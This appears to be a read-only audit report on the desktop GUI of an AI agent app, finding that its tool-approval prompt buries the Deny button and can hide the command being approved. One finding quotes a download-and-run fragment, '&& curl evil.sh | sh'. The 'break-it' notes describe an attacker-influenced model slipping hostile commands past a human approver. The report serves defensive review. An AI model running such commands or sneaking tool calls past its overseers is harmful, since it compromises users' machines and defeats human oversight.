# Lens Report — Design / Webapp (Electron Desktop GUI)

Lens: `audit-design-webapp` (six-gate GUI/UX/front-end review)
Target: `gosling` `ui/desktop` (React + Electron renderer)
Authority: **audit-only / read-only**. Only this file was written.
Builds on: `docs/cloud/00-orientation.md` (shared surface inventory).
ID prefix: `WEB-GSL-NNN`.

---

## 0. Scope, method, and validation limits

This lens reviews the **Electron desktop GUI** — a React/web app rendered in a
Chromium `BrowserWindow` — against the six design gates. The prompt narrowed the
focus to the highest-traffic and security-critical screens:

- the tool-approval / permission dialog (security-critical control),
- the chat / tool-call session surface,
- provider configuration + onboarding,
- extension install (subprocess-spawning) confirmation,
- elicitation (extension-driven data request),
- error / empty / first-run states, dark/light theming.

**This is a STATIC review. The app was NOT run.** Per orientation §7 the Electron
app was not built or launched (heavy release build + provider credentials
unavailable). All findings are `source-evidenced` from the components/styles as
written. Consequences of "not run live":

- Contrast ratios were **not measured** numerically; contrast findings are
  `Uncertain` and flagged for measurement, never scored Fail on their own.
- Keyboard tab-order, focus-trap behavior, and screen-reader output were **not
  exercised**; SR/keyboard findings are reasoned from markup, capped at Likely.
- Responsive breakpoints, touch, and cross-browser are largely **N/A** for a
  single fixed Chromium runtime and were not exercised.
- Non-English i18n rendering (17 locales present) was not visually checked.

**Coverage:** I read ~14 components/styles (approval path end-to-end, onboarding,
provider config, extension modal, elicitation, error boundary, button system,
`index.html`, settings shell, toasts). This is a **prioritized sample** of a
~75K-LOC TS/TSX UI surface. Everything not named in §7 is **Not Reviewed**.

**Gate emphasis:** the prompt's security-critical + workflow focus maps mainly to
**Gate 1 (Product/Workflow)** and **Gate 4 (Accessibility)**, with spot checks of
**Gate 3 (Web Standards)**. Gates 2/5/6 were only touched incidentally and are
scored `Partial (thin coverage)` — not a clean bill.

**Cross-lens boundary:** whether the approval UI *lies* about backend state (e.g.
a decision applied server-side vs. shown, stale approval races) belongs to
`audit-workflow-gui`. `ToolApprovalButtons` already handles a stale-request path
(`resolveAcpPermissionRequest` returns false → "no longer active"), which is
noted here only as a cross-reference; deep truth analysis routes there.

---

## 1. Fast Design Gate triage (5 questions)

| Q | Verdict | Note |
|---|---|---|
| Where am I? | Pass | Settings tabs, onboarding welcome, message stream are clearly located. |
| What matters? | **Partial** | On the security-critical approval, the *decision* is present but its consequences are not visually ranked (WEB-GSL-001), and *what* is being approved can be hidden (WEB-GSL-002). |
| What to do next? | Pass | Onboarding "Connect a provider", empty error states with Retry. |
| What just happened? | **Partial** | Toasts (react-toastify) give visible + announced feedback; but pending-approval / tool-run state is not announced to assistive tech (WEB-GSL-003). |
| How to recover? | Pass | Retry on provider-check failure; Reload on crash; stale-approval + expired-elicitation messages. |

---

## 2. Findings

### WEB-GSL-001: Approval control inverts the safe-default hierarchy; the persistent grant is equal-weight to the one-time grant

Severity: **High** (security-critical control on the primary workflow)
Confidence: **Confirmed** (Observed in markup)
Evidence basis: source-evidenced
Domain: Workflow-GUI (Gate 1 §3 layout/hierarchy; escalated — security control)

Evidence:
- `ui/desktop/src/components/ToolApprovalButtons.tsx:138-157`
- `allow_once` → `variant="secondary"` (filled) `:141`
- `always_allow` → `variant="secondary"` (filled, equal weight) `:148-149`
- `deny_once` → `variant="outline"` (least prominent) `:154`

Observed behavior:
- The three choices on the agent's tool-approval prompt are rendered as a flat
  row of equal-or-descending visual weight: **Allow Once** (secondary/filled),
  **Always Allow** (secondary/filled — *identical* to Allow Once), **Deny**
  (outline — the *least* prominent). All are the same pill size/shape.

Expected boundary:
- Gate 1 §3: "The primary action is visually distinct… Destructive actions are
  visually separated… avoid button soup." For a security gate, the *safe* action
  (Deny) should be the easy/prominent default, and the *high-blast-radius* action
  (Always Allow = standing auto-approval for this tool) should be de-emphasized or
  carry extra friction. The current styling does the opposite: Deny is the
  faintest control, and the persistent grant is visually indistinguishable from
  the reversible one-time grant.

Failure mechanism:
- Consequence is not encoded in visual weight. "Always Allow" removes the human
  gate for all future calls of that tool in scope; "Allow Once" does not. Users
  scan for the filled button and both filled buttons read as "the yes button,"
  so the durable grant is one mis-click away and the safe choice is hardest to hit.

Break-it angle:
- Under prompt fatigue (agents issue many approvals per session — the code caps
  the state map at 500, `:57`), a user habituates to clicking the left/filled
  button; "Always Allow" being filled and adjacent maximizes accidental
  permanent grants to an attacker-influenced tool call.

Impact:
- Accidental standing auto-approval of a destructive/exfiltrating tool. Blast
  radius = the user's workstation (orientation §4). This is the human backstop
  that `SECURITY.md` explicitly leans on.

Operational impact:
- Blast radius: Workflow → Local machine. Side-effect class: process/network/file
  (whatever the granted tool does). Reversibility: compensatable (grant can be
  revoked later) but effect of an executed call may be irreversible. Operator
  visibility: UI-visible. Rerun safety: n/a.

Adjacent failure modes: WEB-GSL-002 (can't see what's granted), WEB-GSL-003 (grant
without focus/announcement).

Recommended mitigation:
- Remediation pattern: consequence-ranked action hierarchy. Make **Deny** the
  visually primary/default action; render **Always Allow** as a de-emphasized,
  clearly-labeled durable grant ("Always allow *this tool* — skips future
  prompts"), visually separated (not adjacent to Allow Once). Behavior test:
  snapshot/DOM assert that the deny control has ≥ the visual weight of allow
  controls and that `always_allow` is not styled identically to `allow_once`.

Implementation assessment:
- Complexity: operator_ux. Cost: S. Cost drivers: 1 component + snapshot test +
  i18n label copy. Nominal agent: claude. Rationale: local UX change, but it is a
  security-affordance decision that benefits from product review of the copy.

Validation: DOM test asserting variant/order; design review that Deny is default.

Non-goals: backend permission semantics (that is `permission/` in the core crate).

---

### WEB-GSL-002: The approval prompt can show only the tool *name* — the user may approve without seeing *what* will run

Severity: **High**
Confidence: **Confirmed**
Evidence basis: source-evidenced
Domain: Workflow-GUI (Gate 1 §3 disclosure / §10 AI-agent review; secondary Gate 4)

Evidence:
- Fallback path renders name-only: `ui/desktop/src/components/GoslingMessage.tsx:165-170`
  (`ToolCallConfirmation` when `!toolConfirmationShownInline`).
- `ToolCallConfirmation.tsx:41-52` renders only `"Allow {toolName}?"` +
  `ToolApprovalButtons` — **no arguments, no description**.
- Inline path shows a one-line description but **collapses full arguments by
  default** in the default "concise" style: `ToolCallWithResponse.tsx:497-505`
  (`responseStyle==='concise' ⇒ isExpandToolDetails=false`), args live behind the
  "Tool Details" expander `:812-818`, `:891-905`.
- The one-line label is **CSS-truncated**: `ToolCallWithResponse.tsx:780`
  (`<span className="truncate flex-1 min-w-0">`) and `:330`.

Observed behavior:
- Two rendering paths exist. (a) When the confirmation id matches a tool request
  in the same message, an inline card shows a one-line summary (e.g. `running
  <command>` from `getToolDescription`, `:592-597`) with the full argument JSON
  collapsed. (b) When it does not match (`toolConfirmationShownInline===false`),
  the standalone card shows **only** `Allow <ToolName>?` with the approve/deny
  buttons and no argument detail at all.

Expected boundary:
- Gate 1 §10: "Generated outputs are reviewable before any destructive action…
  the user can see which model/tool will run." A security approval must show the
  concrete effect (the shell command, the file path, the URL) *at the decision
  point*, not behind a collapsed disclosure or truncated to the viewport.

Failure mechanism:
- The consequential payload (shell `command`, `text_editor` `path`, target `url`)
  is either absent (path b), one expander-click away (path a, default style), or
  visually clipped by `truncate` (a long command's dangerous tail — e.g.
  `... && curl evil.sh | sh` — is cut off with no ellipsis affordance to expand
  in place).

Break-it angle:
- An attacker-influenced model emits a benign-looking prefix and a hostile suffix;
  `truncate` hides the suffix, and the collapsed "Tool Details" is not opened, so
  the user approves on the prefix alone.

Impact:
- Uninformed approval of destructive/exfiltrating tool calls — defeats the purpose
  of the human gate.

Operational impact:
- Blast radius: Local machine. Side-effect class: process/file/network.
  Reversibility: often irreversible. Operator visibility: UI-visible but
  *incomplete*. Rerun safety: n/a.

Adjacent: WEB-GSL-001 (hierarchy), and `audit-workflow-gui` (does the shown name
match what the backend will execute?).

Recommended mitigation:
- Remediation pattern: decision-point full disclosure. At the approval, always
  render the resolved command/path/URL argument(s) un-truncated (wrap or a scroll
  box), for **both** render paths; never gate the payload behind the concise/
  detailed style toggle. Behavior test: given a confirmation for `shell` with a
  200-char command, assert the full command text is present in the approval DOM.

Implementation assessment:
- Complexity: operator_ux. Cost: S–M. Cost drivers: 2 render paths + arg
  formatting + tests. Nominal agent: claude.

Non-goals: redesigning the tool-details expander for non-approval (post-hoc) views.

---

### WEB-GSL-003: A pending tool approval blocks the agent but is not announced to assistive tech and does not receive focus

Severity: **Medium** (High for keyboard/SR-dependent users — accessibility multiplier)
Confidence: **Likely** (markup-reasoned; not verified with a screen reader — see Validation Limits)
Evidence basis: source-evidenced
Domain: Workflow-GUI / Accessibility (Gate 4 §1, §6; Gate 1 §7)

Evidence:
- Approval renders inline in the message stream, not as a dialog:
  `ToolCallWithResponse.tsx:248-286` — a `<div>` with `border-amber-500/50`,
  **no** `role="dialog"`, `aria-modal`, `role="group"`, `aria-live`, or
  `aria-label`.
- `ToolApprovalButtons.tsx:135-157` — three `<Button>`s, no `autoFocus`, no focus
  management, no live region. Only error text has `role="alert"` (`:159`).
- App-wide, `aria-live` appears in exactly **one** component
  (`grep -rln aria-live src` → `UserMessage.tsx` only).

Observed behavior:
- When the agent needs approval it stops and injects the approval card into the
  chat transcript. Focus stays wherever it was (typically the chat input). Nothing
  is announced; a screen-reader or keyboard-only user is not told the agent is now
  blocked awaiting their decision, and must discover the card by arrowing through
  the transcript.

Expected boundary:
- Gate 4 §1: "Modal dialogs trap and restore focus… Error messages are announced
  or clearly associated." Gate 1 §7: "Every user action produces visible feedback…
  distinguishes queued/running/…". A blocking decision request is the strongest
  case for a focus move or an `aria-live="assertive"` announcement.

Failure mechanism:
- The approval is a passive inline node with no ARIA affordance and no focus
  transfer, so non-visual and keyboard-first users get no signal that the workflow
  has halted on them.

Break-it angle:
- SR user dictates a follow-up message into the still-focused input while the agent
  is actually blocked on an unseen approval — the session appears "stuck" with no
  explanation.

Impact:
- The security gate is effectively invisible to accessibility-dependent users,
  and the "agent is waiting on you" state is silent for everyone using AT.

Operational impact:
- Blast radius: Workflow. Side-effect: user-visible (absence of). Reversibility:
  reversible. Operator visibility: **silent** to AT. Rerun safety: n/a.

Recommended mitigation:
- Remediation pattern: announce + focus the blocking request. Wrap the pending
  approval in a labeled region (`role="group"` + `aria-label="Tool approval
  required"`), add an `aria-live="assertive"` announcement when it appears, and
  move focus to the Deny (safe) button. Behavior test: rendering a pending
  approval fires a live-region update and focus lands on the deny control.

Implementation assessment:
- Complexity: operator_ux. Cost: S. Nominal agent: codex. Rationale: local ARIA +
  focus wiring with a testing-library assertion.

Non-goals: general chat-stream live-region strategy (broader task).

---

### WEB-GSL-004: Root `<html>` has no `lang` attribute despite 17-locale i18n

Severity: **Medium**
Confidence: **Confirmed**
Evidence basis: source-evidenced
Domain: Accessibility (Gate 4 §2) — WCAG 3.1.1 Language of Page (Level A)

Evidence:
- `ui/desktop/index.html:2` — `<html>` (no `lang`).
- The pre-paint init script sets `documentElement.classList`/`colorScheme`
  (`:25-31`) but never sets `lang`. `grep -rn "lang=" src *.html` → no match.
- App ships 17 message catalogs (`src/i18n/messages/*.json`).

Observed behavior / mechanism:
- No page language is declared, and it is never updated when the user switches
  locale. Screen readers fall back to the system/default voice and pronounce
  content with the wrong language profile.

Expected boundary: Gate 4 §2 "Page language is declared."

Impact: mispronunciation / degraded SR experience across all locales (Level A fail).

Operational impact: Blast radius: Repo (every screen). Reversibility: reversible.
Operator visibility: silent. 

Recommended mitigation: set `lang` on `<html>` (default `en`) and update it from
the active i18n locale on change. Test: assert `document.documentElement.lang`
matches the active locale after a language switch.

Implementation assessment: Complexity: local_guardrail. Cost: XS. Nominal agent:
codex.

---

### WEB-GSL-005: No skip-to-main-content affordance around persistent nav/sidebar

Severity: **Low**
Confidence: **Likely** (no skip link found; full landmark structure not exhaustively traced)
Evidence basis: source-evidenced
Domain: Accessibility (Gate 4 §2)

Evidence: `grep -rn "skip" src` → no skip link. Persistent chrome exists
(`components/GoslingSidebar`, `Layout/`), repeated across views.

Observed behavior: keyboard/SR users must traverse the sidebar/nav on every view
change to reach the message stream or settings body; no bypass link, and no
`<main>`/skip landmark was found in the sampled shell.

Expected boundary: Gate 4 §2 "A skip-to-main-content link exists where navigation
is repeated."

Recommended mitigation: add a visually-hidden, focus-revealed "Skip to main
content" link targeting the primary content landmark; ensure the content region
is a `<main>`. Test: first Tab from load focuses a skip link that moves focus to
`<main>`.

Implementation assessment: Complexity: local_guardrail. Cost: XS. Agent: codex.

---

### WEB-GSL-006: Top-level crash screen shows the raw error string to the user with no user-facing framing or "Details" fold

Severity: **Low**
Confidence: **Confirmed**
Evidence basis: source-evidenced
Domain: Workflow-GUI (Gate 1 §8 error handling)

Evidence: `ui/desktop/src/components/ErrorBoundary.tsx:83-85` renders
`errorMessage(this.state.error)` directly in a `<pre>` under "Honk!".

Observed behavior: the last-resort boundary always displays the raw error text
inline (not behind a "Details"/logs disclosure). There is a Reload recovery
(`:87`), which is good; the framing ("what failed / whether data was saved / what
to do") is absent.

Expected boundary: Gate 1 §8 "Errors are written for the user, not as a stack
trace. Technical details are available under 'Details' or logs."

Impact: low — this is the catastrophic fallback; a raw string is tolerable but
unpolished and can leak internal paths.

Recommended mitigation: show a plain-language line ("Gosling hit an unexpected
error and needs to reload") with the raw error under a collapsed "Details."
Test: crash fallback shows the friendly heading and hides raw text by default.

Implementation assessment: Complexity: operator_ux. Cost: XS. Agent: codex.

---

### WEB-GSL-007: Pending-approval highlight uses near-zero-opacity tint; salience/contrast unverified

Severity: **Low** (Info until measured)
Confidence: **Uncertain** (cannot measure contrast without running the app)
Evidence basis: requires-authorized-drill (needs live contrast measurement)
Domain: Accessibility / Workflow-GUI (Gate 4 §7; Gate 1 §3)

Evidence: `ToolCallWithResponse.tsx:253` — pending card uses
`border-amber-500/50 bg-amber-50/5`; prompt text `text-amber-600 dark:text-amber-400`
(`:269`) on a `bg-amber-50/10` tint. The `/5` and `/10` alphas make the fill
almost invisible; amber-600 body text on light and amber-400 on dark are the
classic contrast-risk pairings.

Observed behavior: the visual distinction between an ordinary tool card and one
that is *blocking on the user* is carried mostly by a 50%-alpha border and a ~5%
fill — likely faint, and color-only (no icon/text badge marks "action required").

Expected boundary: Gate 4 §7 "color is not the only indicator" + sufficient
non-text contrast; Gate 1 §3 "key status is obvious."

Recommended mitigation: measure amber text/border pairs against WCAG 1.4.3/1.4.11;
add a non-color "Action required" badge/icon so the blocking state is not
color-only. Test: automated contrast check on the token pairs + presence of a
text/icon status marker.

Implementation assessment: Complexity: operator_ux. Cost: S. Agent: claude.

---

### WEB-GSL-008: `parseLinks` renders `href="#"` anchors driven by onClick (non-semantic link target)

Severity: **Low / Info**
Confidence: **Confirmed**
Evidence basis: source-evidenced
Domain: Web Standards (Gate 3 semantic HTML)

Evidence: `ui/desktop/src/components/onboarding/ProviderConfigForm.tsx:46-63` —
setup-help links are `<a href="#" onClick={… openExternal(part)}>`.

Observed behavior: the real destination is not in `href`; the anchor is a
JS-hijacked `#`. Middle-click/copy-link/hover-preview do not reveal or open the
true URL, and the target is not exposed to AT as a link destination.

Expected boundary: Gate 3 "semantic HTML… working links"; Gate 4 §3 "images/links
describe the link target."

Recommended mitigation: put the real URL in `href` and still intercept click for
`openExternal` (so copy-link/preview work). Low priority — onboarding help only.

Implementation assessment: Complexity: local_guardrail. Cost: XS. Agent: codex.

---

## 3. Non-findings (checked and held)

- **Extension install confirmation is well-designed for a security decision.**
  `ExtensionInstallModal.tsx:367-389` maps `untrusted` → `variant="destructive"`
  (red) confirm + yellow warning title; the message spells out the concrete
  `command`/`url` (`:222-236`); the allowlist check **fails toward the stronger
  warning** (`:177-201`, and catch → `untrusted` at `:199-201`); Cancel is the
  left/first button. This is the affordance quality WEB-GSL-001/002 lack — good
  reference to mirror.
- **Onboarding first-run** (`OnboardingGuard.tsx`) has a titled welcome + purpose
  line, a provider selector, and a distinct server-unreachable error state with
  Retry (`:133-148`). Gate 1 §11 first-run intent is met.
- **Settings IA is intent-grouped** (Models / Chat / Session / Prompts / Keyboard /
  Auth / App tabs — `SettingsView.tsx:33-61`), not General/Advanced/Misc. Gate 1 §9
  passes on grouping.
- **Provider config preserves user input on validation failure** — `configValues`
  is component state and validation returns early without clearing it
  (`ProviderConfigForm.tsx:124-149`), required-field errors are shown per-field.
  Gate 1 §5 "inputs preserve user data after validation failure" holds.
- **Reduced-motion is respected** — `src/styles/main.css` has three
  `@media (prefers-reduced-motion: reduce)` blocks (`:371,:380,:878`) plus a JS
  guard in `McpApps/useDisplayMode.ts:106`. Gate 4 §7 partially satisfied.
- **Theme is set pre-paint** (`index.html:10-67`) with a try/catch fallback to
  system preference — avoids a flash of wrong theme; light/dark tokens used
  consistently (`dark:` variants throughout). Gate 5 theming baseline holds.
- **Transient feedback is announced** — toasts use `react-toastify`
  (`toasts.tsx:1`), whose container defaults to an ARIA live region; success/error
  toasts confirm what changed. (The gap is specifically the *inline* approval /
  tool-status states — WEB-GSL-003.)
- **Elicitation timeout is visible and recoverable** — countdown, urgent styling,
  expired + cancelled states, and a stale-submit `role="alert"` error
  (`ElicitationRequest.tsx:158-234`). Gate 1 §7 state handling holds here.
- **Buttons expose a focus indicator** — `button.tsx:7`
  (`focus-visible:ring-ring/50 focus-visible:ring-[1px]`). WCAG 2.4.7 baseline met
  (though a 1px ring is thin; not a 2.1 AA failure).
- **Approval-state memory is bounded** — `ToolApprovalButtons.tsx:57-70` caps the
  cross-session decision map at 500 with FIFO eviction; not a leak.

---

## 4. Gate scorecard (this lens)

| Gate | Score | One-line evidence |
|---|---|---|
| 1 — Product / Workflow | **Fail** | High findings on the security-critical approval hierarchy (WEB-GSL-001) and disclosure (WEB-GSL-002); onboarding/settings/forms otherwise solid. |
| 2 — Front-End Handoff | **Partial (thin)** | Not the focus; a real token/variant system (`button.tsx`, theme tokens) exists but full handoff artifacts were not assessed. |
| 3 — Web Standards | **Partial** | Missing `lang` (WEB-GSL-004), `href="#"` links (WEB-GSL-008); otherwise React markup not exhaustively linted. |
| 4 — Accessibility | **Fail** | Silent/unfocused blocking approval (WEB-GSL-003), missing page language (WEB-GSL-004), no skip link (WEB-GSL-005); reduced-motion + focus rings pass. |
| 5 — Device / Browser Resilience | **Not scored** | Single fixed Chromium; not exercised. |
| 6 — Production Readiness | **Not scored** | Out of lens focus; server-side permission enforcement lives in the Rust `permission/` crate (other lenses). |

A gate on thin coverage never scores Pass; Gates 2/3/5/6 carry the coverage caveat.

---

## 5. Remediation ranking

**Quick wins (XS–S, high value):**
1. WEB-GSL-004 (`lang`) — XS, Level-A a11y fix.
2. WEB-GSL-003 (announce + focus the blocking approval) — S, high a11y/safety value.
3. WEB-GSL-001 (re-rank approval buttons; separate "Always Allow") — S, security affordance.
4. WEB-GSL-005 (skip link) — XS.

**Big rock:**
5. WEB-GSL-002 (always show the resolved payload at the decision point, both paths) — S–M; the highest security-usability value.

**Watch list (measure/confirm live):**
6. WEB-GSL-007 (approval-highlight contrast + non-color status marker) — needs a live contrast measurement.
7. WEB-GSL-006, WEB-GSL-008 — polish.

---

## 6. What would falsify my strongest conclusion?

My strongest conclusion is WEB-GSL-001+002: *the security-critical approval both
under-ranks the safe choice and can hide what is being approved.* It would be
falsified if, at runtime:

- the approval is actually rendered in a **modal that forces argument review**
  before the buttons are enabled, or focus is moved to Deny by a wrapper I did not
  read (I found no such wrapper; `ToolApprovalButtons`/`ToolCallConfirmation` are
  the leaf renderers and neither manages focus or forces disclosure); **or**
- in practice the `toolConfirmationShownInline===false` fallback (name-only) is
  **unreachable** because every confirmation id always matches a same-message tool
  request — this depends on backend message framing I did not trace and would need
  a live session to confirm (it is a real conditional branch at
  `GoslingMessage.tsx:165`, so the name-only card is at least reachable in code);
  **or**
- the default `responseStyle` is actually "detailed" (not "concise") in shipped
  config, which would auto-expand arguments — the component default is `'concise'`
  (`ToolCallWithResponse.tsx:480`), so the collapsed-by-default claim holds unless
  a global setting overrides it.

Running the app and driving one `shell` approval with a long command under the
default settings would confirm or refute WEB-GSL-002 immediately.

---

## 7. Not reviewed (explicit)

BaseChat / ChatInput composition, message queue, sessions list/search UI, model &
provider switching UI, dictation, MCP-app renderer, skills UI, keyboard-shortcuts
editor, response-styles, security/permission *settings* panes, the full
`GoslingSidebar` + `Layout` landmark structure, all `ui/` primitives beyond
`button`, i18n rendering in non-English locales, and any runtime/visual behavior.
Gates 5 and 6 were not run. These are candidates for a follow-up pass and for the
`audit-workflow-gui` lens (approval truth vs. backend) and `audit-playtest-app`
(live drive).
